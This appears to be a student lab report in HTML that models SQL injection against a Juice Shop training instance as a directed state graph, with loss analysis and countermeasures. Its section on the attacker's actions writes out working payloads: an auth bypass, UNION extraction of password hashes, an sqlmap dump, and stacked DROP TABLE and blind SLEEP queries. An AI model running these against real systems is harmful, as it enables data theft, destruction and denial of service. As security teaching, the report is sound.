@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Work 3 — Computer Attacks</title>
+<link rel="stylesheet" href="../shared/report.css">
+</head>
+<body>
+
+<div class="cover">
+  <h1>Lab Work 3<br>Computer Attacks</h1>
+  <div class="sub">SQL injection as a directed graph: attack chain, S<sub>0</sub> → S<sub>i</sub> → S<sub>k</sub></div>
+  <table>
+    <tr><td class="k">Name</td><td>Zhang San</td></tr>
+    <tr><td class="k">Student ID</td><td>12345678</td></tr>
+    <tr><td class="k">Variant</td><td>1</td></tr>
+    <tr><td class="k">Date</td><td>2026-10-19</td></tr>
+  </table>
+</div>
+
+<h2>1. Purpose</h2>
+<p>Choose a specific computer attack, describe the attacker's sequence of actions in detail, and formalise the
+attack as a directed graph: the initial state S<sub>0</sub> (attacker idle), intermediate states S<sub>i</sub>
+(attacker actions or system states), and final states S<sub>k</sub> (the resulting loss). The goal is to practise
+turning an informal narrative into a checkable state machine and to derive countermeasures from it.</p>
+
+<h2>2. Topic and overview</h2>
+<p><span class="tag">Topic</span><b>SQL injection (SQLi)</b> — on the list suggested by the manual, and it connects
+directly to Work 1 and Work 2.</p>
+<table class="data">
+  <tr><th style="width:24%">Item</th><th>Description</th></tr>
+  <tr><td>Vulnerability class</td><td>CWE-89, Improper Neutralization of Special Elements used in an SQL Command;
+      OWASP Top 10 2021 A03: Injection</td></tr>
+  <tr><td>Affected components</td><td>Every place that concatenates user input into SQL — login, search, sorting,
+      filtering — and the database behind it (MySQL / PostgreSQL / SQLite)</td></tr>
+  <tr><td>Root weakness</td><td>The application mixes <i>data</i> into <i>code</i>; the database cannot tell the
+      developer's statement from the attacker's input</td></tr>
+  <tr><td>Typical impact</td><td>Authentication bypass, reading/modifying/deleting arbitrary tables, and — when the
+      database account allows it — operating-system command execution (<code>INTO OUTFILE</code>,
+      <code>xp_cmdshell</code>)</td></tr>
+  <tr><td>Attacker prerequisites</td><td>Network access to one injectable HTTP endpoint (no account needed);
+      the higher the database privileges, the worse the impact</td></tr>
+</table>
+
+<h2>3. The attacker's sequence of actions</h2>
+<p>Using the Work 2 Juice Shop instance (or any login/search endpoint with an injectable parameter), the following
+steps are reproducible. Each step corresponds to one state transition in the graph.</p>
+
+<h3>3.1 Reconnaissance (S<sub>0</sub> → S<sub>1</sub>)</h3>
+<pre>nmap -sV -p 3000,8080 target
+curl -s http://target:3000/ | grep -Ei 'form|input|search'
+curl -s http://target:3000/rest/products/search?q=apple</pre>
+<p>The goal is to find endpoints that accept strings and whose response depends on the database. No state changes yet.</p>
+
+<h3>3.2 Input probing (S<sub>1</sub> → S<sub>2</sub>)</h3>
+<pre>curl -s "http://target:3000/rest/products/search?q='"</pre>
+<p>A single quote breaks the concatenated SQL, producing a 500 or an SQL error message
+(<code>SQLITE_ERROR: unrecognized token</code>) — the injection point is confirmed.</p>
+
+<h3>3.3 Crafting the injection and bypassing authentication (S<sub>2</sub> → S<sub>3</sub>)</h3>
+<pre># authentication bypass: ' OR 1=1--
+curl -s -X POST http://target:3000/rest/user/login \
+     -H 'Content-Type: application/json' \
+     -d '{"email":"admin@juice-sh.op'"'"' OR 1=1--","password":"x"}'
+
+# reading other tables: ')) UNION SELECT id,email,password,... FROM Users--
+curl -s "http://target:3000/rest/products/search?q=apple'))%20UNION%20SELECT%20id,email,password,4,5,6,7,8,9%20FROM%20Users--"</pre>
+<p>Once rows that should not be visible (user table, password hashes) are returned, the injection has succeeded and
+the attacker has read/write access to the database.</p>
+
+<h3>3.4 Data exfiltration (S<sub>3</sub> → S<sub>4</sub> → S<sub>k1</sub>)</h3>
+<pre>sqlmap -u "http://target:3000/rest/products/search?q=apple" \
+       --batch --dbs --dump -T Users</pre>
+<p>Bulk export, or page-by-page extraction through <code>UNION</code>. The data leaves the system boundary,
+which is <b>information theft</b>.</p>
+
+<h3>3.5 Tampering or deletion (S<sub>3</sub> → S<sub>5</sub> → S<sub>k2</sub>)</h3>
+<pre># stacked queries where the driver allows them
+curl -s "http://target/search?q=x'; UPDATE Products SET price=0 WHERE id=1;--"
+curl -s "http://target/search?q=x'; DROP TABLE Reviews;--"</pre>
+<p>Prices become zero or a table disappears; data integrity is destroyed — <b>modification/deletion of information</b>.</p>
+
+<h3>3.6 Blind injection and denial of service (S<sub>2</sub> → S<sub>6</sub> → S<sub>k3</sub>)</h3>
+<pre># boolean blind: true/false difference in the page
+curl -s "http://target/search?q=x' AND SUBSTR((SELECT password FROM Users LIMIT 1),1,1)='a'--"
+# time blind: infer bit by bit, while occupying database connections
+curl -s "http://target/search?q=x' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--"</pre>
+<p>When output is suppressed or filtered, the attacker switches to boolean/time-based blind injection. Each request
+forces the database to evaluate an expensive sub-query, which under concurrency exhausts the connection pool and
+CPU — <b>denial of service</b>.</p>
+
+<h2>4. The directed graph</h2>
+<figure>
+  <img src="digraph-en.png" alt="SQL injection attack digraph">
+  <figcaption>Figure 1 — The attack as a directed graph: S<sub>0</sub> is the initial state, S<sub>i</sub> intermediate
+  states, S<sub>k</sub> loss states; the label on each edge is the attacker action it stands for.</figcaption>
+</figure>
+
+<h3>4.1 States</h3>
+<table class="data">
+  <tr><th style="width:12%">State</th><th style="width:40%">Meaning</th><th>Observable evidence</th></tr>
+  <tr><td>S<sub>0</sub></td><td>Normal operation, no intruder</td><td>baseline traffic, no anomalous queries</td></tr>
+  <tr><td>S<sub>1</sub></td><td>Reconnaissance complete: endpoints and parameters known</td><td>scanning patterns (directory enumeration, unusual user agents)</td></tr>
+  <tr><td>S<sub>2</sub></td><td>Injection point confirmed (input changes SQL semantics)</td><td>quote, <code>--</code>, <code>UNION</code> in request logs</td></tr>
+  <tr><td>S<sub>3</sub></td><td>Injection succeeded: unauthorised data access</td><td>abnormal row counts, error output, unusual query plans</td></tr>
+  <tr><td>S<sub>4</sub></td><td>Bulk data export</td><td>many <code>SELECT</code>s in a short window, egress spike</td></tr>
+  <tr><td>S<sub>5</sub></td><td>Data modified or deleted</td><td><code>UPDATE</code>/<code>DELETE</code>/<code>DROP</code> in audit logs</td></tr>
+  <tr><td>S<sub>6</sub></td><td>Blind/heavy queries consuming resources</td><td>database CPU, slow queries, rising connection count</td></tr>
+  <tr><td>S<sub>k1</sub></td><td>Final: information theft</td><td>sensitive data appears externally</td></tr>
+  <tr><td>S<sub>k2</sub></td><td>Final: information modified/deleted</td><td>integrity checks fail, reconciliation breaks</td></tr>
+  <tr><td>S<sub>k3</sub></td><td>Final: denial of service</td><td>timeouts, 5xx rate, exhausted connection pool</td></tr>
+</table>
+
+<h3>4.2 Edges (transitions)</h3>
+<table class="data">
+  <tr><th style="width:16%">Transition</th><th style="width:30%">Attacker action</th><th>Why it moves the attacker forward</th></tr>
+  <tr><td>S<sub>0</sub>→S<sub>1</sub></td><td>crawl, port scan, enumerate endpoints</td><td>the application exposes enumerable endpoints and parameters</td></tr>
+  <tr><td>S<sub>1</sub>→S<sub>2</sub></td><td>submit a quote/parenthesis, observe the error</td><td>verbose errors reveal the SQL structure</td></tr>
+  <tr><td>S<sub>2</sub>→S<sub>3</sub></td><td>craft <code>OR 1=1--</code>, <code>UNION SELECT</code></td><td>input is concatenated, so the boolean logic is rewritten</td></tr>
+  <tr><td>S<sub>3</sub>→S<sub>4</sub></td><td>dump the target tables</td><td>the database account can read them</td></tr>
+  <tr><td>S<sub>4</sub>→S<sub>k1</sub></td><td>take the data out</td><td>data crossing the system boundary is a leak</td></tr>
+  <tr><td>S<sub>3</sub>→S<sub>5</sub></td><td>stacked write/delete queries</td><td>the account has write privileges</td></tr>
+  <tr><td>S<sub>5</sub>→S<sub>k2</sub></td><td>destroy integrity</td><td>without backups or audit, it is unrecoverable</td></tr>
+  <tr><td>S<sub>2</sub>→S<sub>6</sub></td><td>switch to boolean/time-based blind injection</td><td>even without output, semantic differences are observable</td></tr>
+  <tr><td>S<sub>6</sub>→S<sub>k3</sub></td><td>send concurrent <code>SLEEP()</code> requests</td><td>each request holds a connection and CPU, exhausting resources</td></tr>
+</table>
+
+<h2>5. Loss analysis</h2>
+<table class="data">
+  <tr><th style="width:24%">Loss class</th><th>Manifestation in this attack</th></tr>
+  <tr><td>Information theft</td><td>user table (emails, password hashes), orders and reviews are exported; hashes can be
+      cracked offline and reused to log into other systems</td></tr>
+  <tr><td>Information modified/deleted</td><td>prices changed to zero, reviews removed, tables dropped — integrity and
+      traceability are destroyed</td></tr>
+  <tr><td>Denial of service</td><td>blind injection and heavy queries saturate the connection pool; legitimate users
+      cannot log in or check out</td></tr>
+</table>
+<p>All three can happen in one incident: a successful injection typically steals first, tampers next and ends with
+resource exhaustion. Every path starting at S<sub>0</sub> terminates in some S<sub>k</sub>; no intermediate state is
+left dangling.</p>
+
+<h2>6. Countermeasures</h2>
+<h3>6.1 Prevention (remove the preconditions)</h3>
+<ul>
+  <li><b>Parameterized queries / prepared statements</b>: input is always bound as data, never concatenated into SQL
+      (as implemented in Work 1).</li>
+  <li><b>Allow-list validation</b> for positions that cannot be parameterized (sort column, table name).</li>
+  <li><b>Least-privilege database account</b>: only the necessary <code>SELECT/INSERT</code>, no <code>FILE</code> or
+      <code>SUPER</code> privileges — this cuts S<sub>3</sub>→S<sub>5</sub> and OS command execution.</li>
+  <li><b>Disable verbose errors</b>: a generic error page removes the S<sub>1</sub>→S<sub>2</sub> feedback signal.</li>
+</ul>
+<h3>6.2 Detection (catch S<sub>1</sub>–S<sub>3</sub> early)</h3>
+<ul>
+  <li>WAF rules for <code>UNION</code>, <code>SLEEP(</code>, comment markers; alert on spikes of 4xx/5xx.</li>
+  <li>Database auditing: log unusual <code>UNION</code>, <code>INFORMATION_SCHEMA</code> access and mass exports.</li>
+  <li>Slow-query and connection-count monitoring to spot S<sub>6</sub> behaviour.</li>
+</ul>
+<h3>6.3 Response (limit the impact at S<sub>k</sub>)</h3>
+<ul>
+  <li>Force password resets for leaked credentials and enable 2FA (ties into Work 4).</li>
+  <li>Restore tampered data from a trusted backup; preserve logs for forensics.</li>
+  <li>Rate limiting and circuit breaking so blind injection cannot take the database down.</li>
+</ul>
+
+<h2>7. Conclusion</h2>
+<p>SQL injection is, at its core, a broken boundary between data and code. Describing it as a directed graph turns a
+vague statement ("the attacker injected SQL") into verifiable states and actions: reconnaissance → probing →
+injection → exfiltration/tampering/resource exhaustion. Every edge corresponds to a concrete action, and therefore
+to a place where the attack can be cut — that is the value of formal modelling for defence: find the edge, then
+find the break point.</p>
+<p>The same attack can be drawn differently depending on strategy (blind only, authentication bypass only), but
+S<sub>0</sub> and S<sub>k</sub> must stay stable, otherwise the graphs are not comparable.</p>
+
+<h2>Appendix — control questions</h2>
+<ol>
+  <li><b>Vulnerability vs exploit</b>: a vulnerability is the defect that exists in the system (CWE-89); an exploit is
+      the concrete input/tool that makes it effective (sqlmap). The graph models the exploit process; S<sub>0</sub> is
+      the state where the defect exists but has not been triggered.</li>
+  <li><b>Why define S<sub>0</sub> and S<sub>k</sub> explicitly</b>: without S<sub>0</sub> there is no starting point,
+      without S<sub>k</sub> no measurable loss — the graph degenerates into a flowchart.</li>
+  <li><b>Different graphs for the same attack</b>: an attacker may choose in-band injection or blind injection, pursue
+      persistence or not; paths differ, the terminal class does not.</li>
+  <li><b>Loss classes</b>: this attack covers theft, modification/deletion and denial of service.</li>
+  <li><b>Value for defence</b>: each edge is a hardening opportunity; cut the edges closest to S<sub>0</sub> first,
+      where the cost is lowest and the benefit highest.</li>
+</ol>
+
+</body>
+</html>
